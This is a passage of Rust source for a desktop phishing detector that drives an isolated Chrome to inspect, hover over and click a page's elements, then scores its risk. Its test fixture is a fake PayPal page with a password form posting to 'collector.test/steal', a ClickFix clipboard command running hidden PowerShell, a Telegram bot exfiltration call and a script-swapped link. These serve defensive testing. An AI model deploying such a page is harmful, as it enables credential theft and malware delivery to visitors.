        (self.out)("finding", finding);
    }
}

async fn glide(cdp: &Cdp, s: Option<&str>, at: &mut (f64, f64), to: (f64, f64)) {
    const STEPS: u32 = 9;
    for k in 1..=STEPS {
        let t = k as f64 / STEPS as f64;
        let e = t * t * (3.0 - 2.0 * t);
        let (x, y) = (at.0 + (to.0 - at.0) * e, at.1 + (to.1 - at.1) * e);
        cdp.notify("Input.dispatchMouseEvent", json!({ "type": "mouseMoved", "x": x, "y": y, "button": "none" }), s);
        tokio::time::sleep(Duration::from_millis(18)).await;
    }
    *at = to;
}

async fn click(cdp: &Cdp, s: Option<&str>, (x, y): (f64, f64)) {
    for kind in ["mousePressed", "mouseReleased"] {
        cdp.notify("Input.dispatchMouseEvent", json!({ "type": kind, "x": x, "y": y, "button": "left", "buttons": 1, "clickCount": 1 }), s);
        tokio::time::sleep(Duration::from_millis(40)).await;
    }
}

async fn analyse(r: &mut Run, url: &str, ws: &str) -> Result<Value, String> {
    let (cdp, events) = connect(ws).await?;
    let seen = Arc::new(Observed::default());
    let _ = cdp.call("Browser.setDownloadBehavior", json!({ "behavior": "deny" }), None).await;
    let target = cdp.call("Target.createTarget", json!({ "url": "about:blank" }), None).await?;
    let target_id = target["targetId"].as_str().ok_or("the browser opened no page")?.to_string();
    *lock(&seen.main_frame) = target_id.clone();
    let attached = cdp.call("Target.attachToTarget", json!({ "targetId": target_id, "flatten": true }), None).await?;
    let session = attached["sessionId"].as_str().ok_or("the browser gave no session")?.to_string();
    let s = Some(session.as_str());
    tauri::async_runtime::spawn(pump(r.out.clone(), r.id, cdp.clone(), events, seen.clone()));
    cdp.call("Page.enable", json!({}), s).await?;
    cdp.call("Network.enable", json!({ "maxTotalBufferSize": 0, "maxResourceBufferSize": 0 }), s).await?;
    cdp.call("Emulation.setDeviceMetricsOverride", json!({ "width": WIDTH, "height": HEIGHT, "deviceScaleFactor": 1, "mobile": false }), s).await?;
    cdp.call("Page.addScriptToEvaluateOnNewDocument", json!({ "source": GUARD_JS }), s).await?;
    cdp.call("Fetch.enable", json!({ "patterns": [{ "resourceType": "Document", "requestStage": "Request" }] }), s).await?;
    cdp.call("Page.startScreencast", json!({ "format": "jpeg", "quality": 62, "maxWidth": WIDTH, "maxHeight": HEIGHT, "everyNthFrame": 1 }), s).await?;

    // 1. open the page
    let requested_host = host_of(url);
    r.step("open", &format!("Opening {}", short(url, 70)), "In the agent's own browser, with an empty profile: none of your sign-ins or cookies.", None);
    let nav = cdp.call("Page.navigate", json!({ "url": url }), s).await?;
    if let Some(e) = nav.get("errorText").and_then(Value::as_str).filter(|e| !e.is_empty()) {
        return Err(format!("The page could not be opened ({e})."));
    }
    let deadline = Instant::now() + Duration::from_secs(25);
    let mut complete = false;
    while Instant::now() < deadline {
        if !live(r.id) {
            return Ok(Value::Null);
        }
        if eval(&cdp, s, "document.readyState").await.ok().as_ref().and_then(Value::as_str) == Some("complete") {
            complete = true;
            break;
        }
        tokio::time::sleep(Duration::from_millis(200)).await;
    }
    tokio::time::sleep(Duration::from_millis(600)).await;
    let tree = cdp.call("Page.getFrameTree", json!({}), s).await?;
    if let Some(id) = tree.pointer("/frameTree/frame/id").and_then(Value::as_str) {
        *lock(&seen.main_frame) = id.to_string();
    }
    seen.intercepting.store(true, Ordering::SeqCst);
    let final_url = tree.pointer("/frameTree/frame/url").and_then(Value::as_str).unwrap_or(url).to_string();
    let final_host = host_of(&final_url);
    let redirects = lock(&seen.redirects).len().saturating_sub(1);
    (r.out)("page", json!({ "url": final_url, "https": final_url.starts_with("https://"), "redirects": redirects, "loaded": complete }));
    if !complete {
        r.find("info", "The page was still loading after 25 seconds; the agent checked what had loaded.");
    }
    if !final_host.is_empty() && site(&final_host) != site(&requested_host) {
        r.find("warn", &format!("Opening {requested_host} took the browser to another site: {final_host}."));
    } else if redirects > 0 {
        r.find("info", &format!("The address redirected {redirects} time(s) and stayed on {}.", site(&final_host)));
    }
    if !final_url.starts_with("https://") {
        r.find("warn", "The page is not encrypted (http, not https).");
    }

    // 2. the address, with the on-device models
    r.step("model", "Checking the address with the on-device URL models", "The trained models on this computer; nothing is sent.", None);
    let ml = crate::local_ml::scan(&final_url).await.ok();
    let ml_risk = ml.as_ref().and_then(|v| v.pointer("/data/riskScore")).and_then(Value::as_i64);
    match ml_risk {
        Some(risk) if risk >= 50 => r.find("warn", &format!("The URL models rate the address {risk} / 100.")),
        Some(risk) => r.find("ok", &format!("The URL models rate the address {risk} / 100.")),
        None => r.find("info", "The on-device URL models were not available."),
    }

    // 3. the page's structure and content
    r.step("inspect", "Reading the page's forms, links, buttons and scripts", "", None);
    let page = eval(&cdp, s, INSPECT_JS).await?;
    let title = page["title"].as_str().unwrap_or("").to_string();
    (r.out)("page", json!({ "url": final_url, "title": title, "https": final_url.starts_with("https://"), "redirects": redirects, "loaded": complete,
        "counts": { "links": page["links"].as_array().map(Vec::len), "forms": page["forms"].as_array().map(Vec::len), "buttons": page["buttons"].as_array().map(Vec::len), "passwords": page["passwords"].as_array().map(Vec::len) } }));
    let (content_risk, content_signals) = crate::agent::content_phish_signals(page["html"].as_str().unwrap_or(""));
    for signal in content_signals.iter().take(4) {
        r.find(if content_risk >= 50 { "warn" } else { "info" }, &format!("Page content: {signal}"));
    }
    if let Some(n) = page["hiddenFrames"].as_u64().filter(|n| *n > 0) {
        r.find("info", &format!("{n} hidden frame(s) on the page."));
    }
    if let Some(refresh) = page["metaRefresh"].as_str().filter(|t| !t.is_empty()) {
        r.find("warn", &format!("The page sends the browser on automatically (refresh: {}).", short(refresh, 80)));
    }
    let scripts = page["scriptHosts"].as_array().map(Vec::len).unwrap_or(0);
    if scripts > 0 {
        r.find("info", &format!("Scripts load from {scripts} other site(s)."));
    }
    for form in page["forms"].as_array().into_iter().flatten().filter(|f| f["offsite"] == true && f["hasPassword"] != true).take(2) {
        r.find("info", &format!("A form sends to another site: {}.", form["actionHost"].as_str().unwrap_or("")));
    }

    // 3b. the evidence: the response, the traffic, the code, the brand it claims
    let page_site = site(&final_host);
    let doc = lock(&seen.document).clone();
    r.fact("Final address", short(&final_url, 140), "");
    r.fact("Redirects", redirects.to_string(), if redirects > 0 { "warn" } else { "" });
    if let Some(code) = doc["status"].as_i64() {
        r.fact("HTTP status", code.to_string(), if code >= 400 { "warn" } else { "" });
    }
    if let Some(ip) = doc["remoteIPAddress"].as_str().filter(|ip| !ip.is_empty()) {
        r.fact("Server address", ip.to_string(), "");
    }
    if let Some(tls) = doc.get("securityDetails").filter(|v| v.is_object()) {
        r.fact("Encryption", format!("{}, certificate from {}", tls["protocol"].as_str().unwrap_or("TLS"), tls["issuer"].as_str().unwrap_or("unknown issuer")), "good");
        if let Some(from) = tls["validFrom"].as_f64() {
            let age = today() - (from as i64) / 86_400;
            r.fact("Certificate issued", format!("{age} day(s) ago"), if age < 7 { "warn" } else { "" });
            if age < 3 {
                r.find("info", &format!("The certificate was issued {age} day(s) ago. New phishing sites often have brand-new certificates, though a renewal looks the same."));
            }
        }
    } else {
        r.fact("Encryption", "none (http)", "bad");
    }
    let headers = &doc["headers"];
    let missing: Vec<&str> = [("strict-transport-security", "HSTS"), ("content-security-policy", "CSP"), ("x-frame-options", "X-Frame-Options")]
        .iter().filter(|(k, _)| header(headers, k).is_none()).map(|(_, n)| *n).collect();
    r.fact("Security headers", if missing.is_empty() { "HSTS, CSP and X-Frame-Options present".to_string() } else { format!("missing {}", missing.join(", ")) }, if missing.len() >= 2 { "warn" } else { "" });
    if let Some(server) = header(headers, "server") {
        r.fact("Server software", short(server, 60), "");
    }
    let hosts = lock(&seen.hosts).clone();
    let total: u32 = hosts.values().sum();
    let mut others: Vec<(String, u32)> = hosts.iter().filter(|(h, _)| site(h) != page_site).map(|(h, n)| (h.clone(), *n)).collect();
    others.sort_by(|a, b| b.1.cmp(&a.1));
    let other_sites: std::collections::HashSet<String> = others.iter().map(|(h, _)| site(h)).collect();
    r.fact("Requests", format!("{total} to {} host(s), {} other site(s)", hosts.len(), other_sites.len()), "");
    if !others.is_empty() {
        r.fact("Other hosts contacted", others.iter().take(6).map(|(h, n)| format!("{h} ({n})")).collect::<Vec<_>>().join(", "), "");
    }
    let raw_ips: Vec<&String> = hosts.keys().filter(|h| h.parse::<IpAddr>().is_ok()).collect();
    if !raw_ips.is_empty() && final_host.parse::<IpAddr>().is_err() {
        r.find("warn", &format!("The page loads content straight from IP addresses instead of names: {}.", raw_ips.iter().take(3).map(|s| s.as_str()).collect::<Vec<_>>().join(", ")));
    }
    let sockets = lock(&seen.sockets).clone();
    if !sockets.is_empty() {
        r.fact("Live connections", sockets.iter().take(3).cloned().collect::<Vec<_>>().join(", "), "");
    }
    if let Ok(jar) = cdp.call("Storage.getCookies", json!({}), None).await {
        // Only the cookies of sites this page contacted: the browser keeps a few of its own.
        let cookie_site = |c: &Value| site(c["domain"].as_str().unwrap_or("").trim_start_matches('.'));
        let cookies: Vec<Value> = jar["cookies"].as_array().into_iter().flatten()
            .filter(|c| { let s = cookie_site(c); s == page_site || other_sites.contains(&s) }).cloned().collect();
        let third = cookies.iter().filter(|c| cookie_site(c) != page_site).count();
        r.fact("Cookies set", format!("{} ({} from other sites)", cookies.len(), third), "");
    }
    let counts = |key: &str| page[key].as_array().map(Vec::len).unwrap_or(0);
    r.fact("Page elements", format!("{} links, {} forms, {} buttons, {} password field(s)", counts("links"), counts("forms"), counts("buttons"), counts("passwords")), "");
    r.fact("Scripts from other sites", scripts.to_string(), "");
    r.fact("Hidden inputs", page["hiddenInputs"].as_u64().unwrap_or(0).to_string(), "");

    let exfil: Vec<String> = page["exfil"].as_array().into_iter().flatten().filter_map(|v| v.as_str().map(str::to_string)).collect();
    if !exfil.is_empty() {
        r.find("high", &format!("The page's code can send data to {}: a common way phishing kits collect what people type.", exfil.join(", ")));
    }
    let clipboard = page["clipboard"] == true;
    let run_dialog = page["runDialog"] == true;
    if clipboard && run_dialog {
        r.find("high", "Fake verification trick (ClickFix): the page copies a command to the clipboard and tells visitors to paste it into Windows Run or a terminal. Never do that.");
    } else if run_dialog {
        r.find("warn", "The page tells visitors to run a command (Windows Run, PowerShell or a terminal).");
    } else if clipboard {
        r.find("info", "The page's code can write to the clipboard.");
    }
    let o = &page["obfuscation"];
    let n = |k: &str| o[k].as_u64().unwrap_or(0);
    let heavy = n("longBlobs") > 0 || (n("eval") > 0 && (n("atob") > 0 || n("charCodes") > 2 || n("unescape") > 0));
    r.fact("Script tricks", format!("eval {} · atob {} · fromCharCode {} · document.write {} · encoded blocks {}", n("eval"), n("atob"), n("charCodes"), n("docWrite"), n("longBlobs")), if heavy { "warn" } else { "" });
    if heavy {
        r.find("warn", "The page's script is obfuscated (encoded blocks or eval of decoded text), a way to hide what it does.");
    }
    let downloads: Vec<(String, String)> = page["downloads"].as_array().into_iter().flatten()
        .map(|d| (d["text"].as_str().unwrap_or("").to_string(), d["href"].as_str().unwrap_or("").to_string())).collect();
    if !downloads.is_empty() {
        let names: Vec<String> = downloads.iter().map(|(_, h)| h.rsplit('/').next().unwrap_or("").split(['?', '#']).next().unwrap_or("").to_string()).filter(|n| !n.is_empty()).collect();
        r.fact("Downloads offered", short(&names.join(", "), 160), "warn");
        let programs: Vec<&String> = names.iter().filter(|n| {
            let l = n.to_lowercase();
            [".exe", ".msi", ".scr", ".bat", ".cmd", ".ps1", ".vbs", ".hta", ".lnk", ".jar", ".apk", ".iso", ".img"].iter().any(|e| l.ends_with(e))
        }).collect();
        if !programs.is_empty() {
            r.find("warn", &format!("The page offers programs to download: {}. Scan them on Analyze before opening.", programs.iter().take(3).map(|s| s.as_str()).collect::<Vec<_>>().join(", ")));
        }
    }
    let elsewhere: Vec<String> = page["framesElsewhere"].as_array().into_iter().flatten().filter_map(|v| v.as_str().map(str::to_string)).collect();
    if !elsewhere.is_empty() {
        r.fact("Frames from other sites", elsewhere.join(", "), "");
    }
    if final_host.contains("xn--") {
        r.find("warn", "The address uses an internationalised (punycode) name, which can imitate another site's name with look-alike letters.");
    }
    let has_password = page["passwords"].as_array().map(|a| a.iter().any(|p| p["visible"] == true)).unwrap_or(false);
    for brand in brands_in_host(&final_host).into_iter().take(2) {
        r.find(if has_password { "high" } else { "warn" }, &format!("The address uses the name “{brand}” but the site, {page_site}, is not {brand}'s."));
    }
    let favicon = page["favicon"].as_str().unwrap_or("");
    let claimed = brands_claimed(&format!("{} {}", page["brandText"].as_str().unwrap_or(""), favicon), &page_site);
    for brand in claimed.iter().take(2) {
        if has_password {
            r.find("high", &format!("The page presents itself as {brand} and asks for a password, but it is not on {brand}'s site ({page_site})."));
        } else {
            r.find("info", &format!("The page shows {brand}'s name or logo but is not on {brand}'s site."));
        }
    }
    r.fact("On-device URL models", ml_risk.map(|v| format!("{v} / 100")).unwrap_or_else(|| "unavailable".into()), if ml_risk.unwrap_or(0) >= 50 { "warn" } else { "" });
    r.fact("Page content score", format!("{content_risk} / 100"), if content_risk >= 50 { "warn" } else { "" });

    // 4. move to, hover and click what matters, like a person checking the page
    let targets = choose_targets(&page);
    (r.out)("plan", json!({ "targets": targets.len() }));
    let mut at = (WIDTH / 2.0, HEIGHT / 2.0);
    let mut checked = 0usize;
    let passwords: HashMap<u64, Value> = page["passwords"].as_array().into_iter().flatten().map(|p| (p["i"].as_u64().unwrap_or(0), p.clone())).collect();
    for t in &targets {
        if !live(r.id) {
            return Ok(Value::Null);
        }
        match eval(&cdp, s, &scroll_js(t.i)).await.ok().as_ref().and_then(Value::as_str) {
            Some("visible") => {}
            Some("scrolled") => tokio::time::sleep(Duration::from_millis(140)).await,
            _ => continue,
        }
        let Ok(rect) = eval(&cdp, s, &measure_js(t.i)).await else { continue };
        let (x, y, w, h) = (rect["x"].as_f64().unwrap_or(-1.0), rect["y"].as_f64().unwrap_or(-1.0), rect["w"].as_f64().unwrap_or(0.0), rect["h"].as_f64().unwrap_or(0.0));
        if w < 2.0 || h < 2.0 || x + w < 0.0 || y + h < 0.0 || x > WIDTH || y > HEIGHT {
            continue;
        }
        let point = ((x + w / 2.0).clamp(4.0, WIDTH - 4.0), (y + h / 2.0).clamp(4.0, HEIGHT - 4.0));
        let target = json!({ "x": x, "y": y, "w": w, "h": h, "px": point.0, "py": point.1 });
        checked += 1;
        match t.kind {
            "password" => {
                r.step("inspect", "Inspecting the password field", "The agent never types into it.", Some(target));
                glide(&cdp, s, &mut at, point).await;
                tokio::time::sleep(Duration::from_millis(250)).await;
                let p = passwords.get(&t.i).cloned().unwrap_or(Value::Null);
                if !final_url.starts_with("https://") {
                    r.find("high", "This page asks for a password without encryption.");
                }
                if p["offsite"] == true {
                    r.find("high", &format!("The sign-in form sends the password to another site: {}.", p["formHost"].as_str().unwrap_or("")));
                } else if p["inForm"] == true {
                    r.find("ok", "The sign-in form sends to this same site.");
                } else {
                    r.find("info", "The password field is not in a form; a script handles what is typed.");
                }
            }
            _ => {
                let what = if t.kind == "link" { "link" } else { "button" };
                r.step("move", &format!("Moving to the {what} “{}”", t.label), "", Some(target.clone()));
                glide(&cdp, s, &mut at, point).await;
                tokio::time::sleep(Duration::from_millis(120)).await;
                let after_hover = eval(&cdp, s, &measure_js(t.i)).await.ok().and_then(|v| v["href"].as_str().map(str::to_string)).unwrap_or_default();
                lock(&seen.stopped).clear();
                let dialogs_before = lock(&seen.dialogs).len();
                let _ = eval(&cdp, s, "window.__cfOpened&&(window.__cfOpened.length=0)").await;
                r.step("click", &format!("Clicking the {what} “{}”", t.label), "A click that would leave the page is stopped and its destination recorded.", Some(target));
                click(&cdp, s, point).await;
                let mut destination: Option<(String, &str)> = None;
                for _ in 0..12 {
                    tokio::time::sleep(Duration::from_millis(60)).await;
                    if let Some(u) = lock(&seen.stopped).first().cloned() {
                        destination = Some((u, "navigate"));
                        break;
                    }
                    if let Some(u) = eval(&cdp, s, "(window.__cfOpened||[])[0]||''").await.ok().and_then(|v| v.as_str().map(str::to_string)).filter(|u| !u.is_empty()) {
                        destination = Some((u, "window"));
                        break;
                    }
                }
                let new_dialogs: Vec<String> = lock(&seen.dialogs).iter().skip(dialogs_before).cloned().collect();
                for d in new_dialogs {
                    r.find("warn", &format!("The click made the page show a {d}; the agent dismissed it."));
                }
                match destination {
                    Some((dest, how)) => {
                        let dest_host = host_of(&dest);
                        let shown = host_of(&t.href);
                        if !t.text_domain.is_empty() && !dest_host.is_empty() && site(&t.text_domain) != site(&dest_host) {
                            r.find("high", &format!("The link says “{}” but goes to {dest_host}.", t.text_domain));
                        } else if t.kind == "link" && !shown.is_empty() && !dest_host.is_empty() && site(&shown) != site(&dest_host) {
                            r.find("warn", &format!("The link shows {shown}, but the click went to {dest_host} (changed by the page's script)."));
                        } else if !after_hover.is_empty() && !t.href.is_empty() && after_hover != t.href {
                            r.find("warn", "The link's address changed when the mouse moved over it.");
                        } else {
                            let place = if dest_host.is_empty() || site(&dest_host) == site(&final_host) { "this site".to_string() } else { dest_host.clone() };
                            let verb = if how == "window" { "tried to open a new window on" } else { "leads to" };
                            r.find("info", &format!("“{}” {verb} {place}; the agent stopped there.", t.label));
                        }
                        (r.out)("destination", json!({ "label": t.label, "url": short(&dest, 300), "how": how }));
                    }
                    None => r.find("info", &format!("“{}”: the click stayed on this page.", t.label)),
                }
            }
        }
    }
    if targets.is_empty() {
        r.find("info", "Nothing on the page to move to or click: no visible links, buttons or password fields.");
    }

    // 5. the verdict
    let finding_risk = r.findings.iter().map(|f| match f["severity"].as_str() { Some("high") => 75, Some("warn") => 45, _ => 0 }).max().unwrap_or(0);
    let risk = [ml_risk.unwrap_or(0), content_risk, finding_risk].into_iter().max().unwrap_or(0).clamp(0, 100);
    let verdict = verdict_label(risk);
    let _ = cdp.call("Page.stopScreencast", json!({}), s).await;
    let _ = cdp.call("Browser.close", json!({}), None).await;
    Ok(json!({ "url": final_url, "title": title, "risk": risk, "verdict": verdict, "mlRisk": ml_risk, "contentRisk": content_risk,
               "checked": checked, "findings": r.findings.len(), "high": r.findings.iter().filter(|f| f["severity"] == "high").count() }))
}

async fn run_live(app: AppHandle, id: u64, url: String, source: String) {
    let started = Instant::now();
    emit(&app, id, "start", json!({ "url": url, "source": source }));
    emit(&app, id, "step", json!({ "n": 0, "action": "launch", "label": "Starting the agent's isolated browser", "detail": "" }));
    let mut r = Run { out: to_window(app.clone(), id), id, findings: Vec::new(), steps: 0 };
    // With cloud scanning allowed, two checks run while the browser works: the
    // domain's registration date (public RDAP directory) and CyberForge's server
    // URL models. Without it, nothing about the address leaves this computer.
    let extras = if crate::privacy::allowed(crate::privacy::Feature::CloudScanning) {
        let (a, u, site_name) = (app.clone(), url.clone(), site(&host_of(&url)));
        Some(tauri::async_runtime::spawn(async move { tokio::join!(domain_registered(&site_name), server_models(&a, &u)) }))
    } else {
        None
    };
    let outcome = match launch().await {
        Err(e) => Err(e),
        Ok((mut browser, ws)) => {
            emit(&app, id, "browser", json!({ "name": browser.name }));
            let result = match tokio::time::timeout(RUN_LIMIT, analyse(&mut r, &url, &ws)).await {
                Ok(result) => result,
                Err(_) => Err("The run reached its two-minute limit.".into()),
            };
            browser.close().await;
            result
        }
    };
    if !live(id) {
        emit(&app, id, "done", json!({ "stopped": true, "seconds": started.elapsed().as_secs_f64() }));
        return;
    }
    match outcome {
        Ok(mut verdict) if !verdict.is_null() => {
            let mut risk = verdict["risk"].as_i64().unwrap_or(0);
            match extras {
                Some(handle) => {
                    r.step("model", "Checking the domain's age and the server's URL models", "Cloud scanning is on: the address went to the public RDAP directory and to CyberForge's models.", None);
                    match tokio::time::timeout(Duration::from_secs(12), handle).await {
                        Ok(Ok((age, server))) => {
                            match age {
                                Some((days, date)) => {
                                    r.fact("Domain registered", format!("{date} ({days} days ago)"), if days < 30 { "warn" } else { "good" });
                                    if days < 7 {
                                        r.find("high", &format!("The domain was registered {days} day(s) ago. Most phishing sites are days old."));
                                        risk = risk.max(75);
                                    } else if days < 30 {
                                        r.find("warn", &format!("The domain was registered {days} days ago."));
                                        risk = risk.max(45);
                                    } else {
                                        r.find("ok", &format!("The domain was registered on {date}, {} year(s) ago.", days / 365));
                                    }
                                }
                                None => r.fact("Domain registered", "not published in RDAP for this domain", ""),
                            }
                            match server.as_ref().and_then(|v| v["risk_score"].as_f64()) {
                                Some(score) => {
                                    let score = score.round() as i64;
                                    let bert = server.as_ref().and_then(|v| v.pointer("/components/bert_threat_score")).and_then(Value::as_f64);
                                    r.fact("Server URL models", format!("{score} / 100{}", bert.map(|b| format!(" (BERT {:.0})", b * 100.0)).unwrap_or_default()), if score >= 50 { "warn" } else { "good" });
                                    if score >= 50 {
                                        r.find("warn", &format!("CyberForge's server models rate the address {score} / 100."));
                                    }
                                    risk = risk.max(score);
                                }
                                None => r.fact("Server URL models", "not available (sign in, or the service is starting)", ""),
                            }
                        }
                        _ => r.find("info", "The cloud checks did not answer in time."),
                    }
                }
                None => r.fact("Cloud checks", "off: allow cloud scanning in Settings → Privacy to add the domain's age and the server's models", ""),
            }
            let risk = risk.clamp(0, 100);
            verdict["risk"] = json!(risk);
            verdict["verdict"] = json!(verdict_label(risk));
            verdict["findings"] = json!(r.findings.len());
            verdict["high"] = json!(r.findings.iter().filter(|f| f["severity"] == "high").count());
            emit(&app, id, "verdict", verdict.clone());
            let state = app.state::<SharedState>();
            crate::event_journal::publish(&app, state.inner(), "scan:update", json!({
                "url": verdict["url"], "verdict": verdict["verdict"], "riskScore": verdict["risk"],
                "source": "live-agent-browser", "durationMs": started.elapsed().as_millis() as u64,
                "message": "The agent opened the page in its own browser, hovered and clicked to check it",
            })).await;
        }
        Ok(_) => {}
        Err(message) => emit(&app, id, "error", json!({ "message": message })),
    }
    emit(&app, id, "done", json!({ "seconds": started.elapsed().as_secs_f64() }));
}

// ── commands ─────────────────────────────────────────────────────────────────

/// Start a run on an address (`source`: "active-tab", "recent" or "entered").
/// A run already going is stopped.
#[tauri::command]
pub async fn live_browse_start(app: AppHandle, url: String, source: Option<String>) -> Result<Value, String> {
    let raw = crate::input::text(&url, "url", 2048)?;
    let raw = if raw.contains("://") { raw } else { format!("https://{raw}") };
    let address = crate::system::redact_url(&raw);
    let parsed = reqwest::Url::parse(&address).map_err(|_| "Enter a valid http:// or https:// address".to_string())?;
    if !["http", "https"].contains(&parsed.scheme()) {
        return Err("Enter a valid http:// or https:// address".into());
    }
    let host = parsed.host_str().ok_or("Enter a valid http:// or https:// address")?.to_string();
    let refusal = "The live agent does not visit addresses on this computer or your local network.";
    if local_host(&host) {
        return Err(refusal.into());
    }
    let port = parsed.port_or_known_default().unwrap_or(443);
    if let Ok(addresses) = tokio::net::lookup_host((host.as_str(), port)).await {
        if addresses.into_iter().any(|a| private_ip(a.ip())) {
            return Err(refusal.into());
        }
    }
    if browser_path().is_none() {
        return Err("No Chrome, Edge, Brave or Chromium was found on this computer; the live agent needs one of them.".into());
    }
    let source = match source.as_deref() {
        Some("active-tab") => "active-tab",
        Some("recent") => "recent",
        _ => "entered",
    };
    let id = RUN.fetch_add(1, Ordering::SeqCst) + 1;
    tauri::async_runtime::spawn(run_live(app, id, parsed.to_string(), source.to_string()));
    Ok(json!({ "run": id, "url": parsed.as_str() }))
}

/// Stop the current run; its browser is closed.
#[tauri::command]
pub async fn live_browse_stop() -> Result<Value, String> {
    RUN.fetch_add(1, Ordering::SeqCst);
    Ok(json!({ "stopped": true }))
}

/// The page most recently opened in the user's browsers (a fresh, small read of
/// their history; needs the history permission). Addresses on this computer or
/// the local network are skipped.
#[tauri::command]
pub async fn live_browse_recent(state: State<'_, SharedState>) -> Result<Value, String> {
    crate::privacy::require(crate::privacy::Feature::HistoryAccess)?;
    let _ = &state;
    let snapshot = crate::system::collect_history_snapshot(5, 25).await;
    let item = snapshot
        .pointer("/data/history")
        .and_then(Value::as_array)
        .into_iter()
        .flatten()
        .find(|it| {
            let url = it["url"].as_str().unwrap_or("");
            (url.starts_with("https://") || url.starts_with("http://")) && !local_host(&host_of(url))
        })
        .cloned();
    Ok(match item {
        Some(it) => json!({ "url": it["url"], "title": it["title"], "browser": it["browser"], "lastVisit": it["lastVisit"] }),
        None => json!({ "url": null }),
    })
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn local_and_private_addresses_are_refused() {
        for h in ["localhost", "127.0.0.1", "10.0.0.8", "192.168.1.1", "172.16.4.2", "169.254.1.1", "100.64.0.1", "[::1]", "fd00::1", "fe80::1", "router", "printer.local", "nas.lan", "app.localhost", "::ffff:192.168.0.1"] {
            assert!(local_host(h), "{h} should be refused");
        }
        for h in ["example.com", "8.8.8.8", "www.bbc.co.uk", "2606:4700::1111"] {
            assert!(!local_host(h), "{h} should be allowed");
        }
    }

    #[test]
    fn sites_are_told_apart_by_registered_domain() {
        assert_eq!(site("login.paypal.com"), "paypal.com");
        assert_eq!(site("www.bbc.co.uk"), "bbc.co.uk");
        assert_eq!(site("paypal.com.evil.xyz"), "evil.xyz");
        assert_ne!(site("paypal.com"), site("paypa1.com"));
        assert_eq!(site("127.0.0.1"), "127.0.0.1");
    }

    #[test]
    fn deceptive_links_and_password_fields_come_first() {
        let page = json!({
            "passwords": [{ "i": 9, "visible": true }],
            "links": [
                { "i": 1, "text": "About us", "href": "https://shop.example/about", "external": false, "js": false, "hash": false, "textDomain": "", "mismatch": false },
                { "i": 2, "text": "Go to paypal.com", "href": "https://evil.example/x", "external": true, "js": false, "hash": false, "textDomain": "paypal.com", "mismatch": true },
                { "i": 3, "text": "Top", "href": "https://shop.example/#top", "hash": true },
            ],
            "buttons": [{ "i": 5, "text": "Sign in", "inPasswordForm": true }, { "i": 6, "text": "Download now", "inPasswordForm": false }],
        });
        let targets = choose_targets(&page);
        let order: Vec<(&str, u64)> = targets.iter().map(|t| (t.kind, t.i)).collect();
        assert_eq!(order, vec![("password", 9), ("link", 2), ("link", 1), ("button", 6)]);
        assert_eq!(targets[1].text_domain, "paypal.com");
    }

    const TRAP: &str = r#"<!doctype html><html><head><title>PayPal: Account check</title></head><body style="font:16px sans-serif;padding:40px">
<h1>Account check</h1>
<form action="https://collector.test/steal" method="post"><input name=u><input type=password name=p><button type=submit>Sign in</button></form>
<p><a id=fake href="/elsewhere">Continue to paypal.com</a></p>
<p><a id=swap href="/docs">Read the docs</a></p>
<button id=dl onclick="location.href='https://downloads.test/setup.exe'">Download now</button>
<p>To verify you are human: press Windows + R, then Ctrl + V and Enter.</p>
<p><a href="/files/setup.exe">Get the installer</a></p>
<script>function verify(){navigator.clipboard.writeText('powershell -w hidden -c iwr x');fetch('https://api.telegram.org/bot123:abc/sendMessage')}</script>
<script>document.getElementById('swap').addEventListener('mousedown',function(){this.href='https://swapped.test/x'});</script>
</body></html>"#;

    async fn serve(listener: tokio::net::TcpListener) {
        use tokio::io::{AsyncReadExt, AsyncWriteExt};
        while let Ok((mut socket, _)) = listener.accept().await {
            tokio::spawn(async move {
                let mut buf = [0u8; 4096];
                let n = socket.read(&mut buf).await.unwrap_or(0);
                let request = String::from_utf8_lossy(&buf[..n]).to_string();
                let path = request.split_whitespace().nth(1).unwrap_or("/");
                let body = if path == "/" { TRAP } else { "<html><body>elsewhere</body></html>" };
                let reply = format!("HTTP/1.1 200 OK\r\nContent-Type: text/html; charset=utf-8\r\nContent-Length: {}\r\nConnection: close\r\n\r\n{}", body.len(), body);
                let _ = socket.write_all(reply.as_bytes()).await;
            });
        }
    }

    #[tokio::test(flavor = "multi_thread", worker_threads = 4)]
    #[ignore = "drives a real Chrome or Edge: cargo test -p cyberforge-console live_browse -- --ignored"]
    async fn the_agent_catches_a_deceptive_page_in_a_real_browser() {
        if browser_path().is_none() {
            eprintln!("no Chrome or Edge here; skipped");
            return;
        }
        let listener = tokio::net::TcpListener::bind("127.0.0.1:0").await.unwrap();
        let port = listener.local_addr().unwrap().port();
        tokio::spawn(serve(listener));
        let events: Arc<std::sync::Mutex<Vec<(String, Value)>>> = Default::default();
        let sink = events.clone();
        let id = RUN.fetch_add(1, Ordering::SeqCst) + 1;
        let mut r = Run { out: Arc::new(move |k: &str, v: Value| sink.lock().unwrap().push((k.to_string(), v))), id, findings: vec![], steps: 0 };
        let started = Instant::now();
        let (mut browser, ws) = launch().await.expect("the browser starts");
        let verdict = analyse(&mut r, &format!("http://127.0.0.1:{port}/"), &ws).await;
        eprintln!("run took {:.1} s", started.elapsed().as_secs_f64());
        browser.close().await;
        let verdict = verdict.expect("the run completes");
        let texts: Vec<String> = r.findings.iter().map(|f| format!("{}: {}", f["severity"].as_str().unwrap(), f["text"].as_str().unwrap())).collect();
        eprintln!("{texts:#?}\n{verdict}");
        let has = |needle: &str| texts.iter().any(|t| t.contains(needle));
        assert!(has("high: The sign-in form sends the password to another site: collector.test"));
        assert!(has("high: This page asks for a password without encryption."));
        assert!(has("high: The link says “paypal.com” but goes to 127.0.0.1"));
        assert!(has("but the click went to swapped.test (changed by the page's script)"));
        assert!(has("leads to downloads.test"));
        assert!(has("high: The page's code can send data to api.telegram.org/bot"));
        assert!(has("high: Fake verification trick (ClickFix)"));
        assert!(has("high: The page presents itself as PayPal and asks for a password"));
        assert!(has("offers programs to download: setup.exe"));
        let facts: Vec<String> = events.lock().unwrap().iter().filter(|(k, _)| k == "fact").map(|(_, v)| format!("{}: {}", v["key"].as_str().unwrap(), v["value"].as_str().unwrap())).collect();
        eprintln!("{facts:#?}");
        assert!(facts.iter().any(|f| f.starts_with("HTTP status: 200")));
        assert!(facts.iter().any(|f| f.starts_with("Requests: ")));
        assert!(facts.iter().any(|f| f.starts_with("Encryption: none (http)")));
        let seen = events.lock().unwrap();
        // CYBERFORGE_LIVE_DUMP=<file>: keep the run's events, to replay them into the page.
        if let Ok(path) = std::env::var("CYBERFORGE_LIVE_DUMP") {
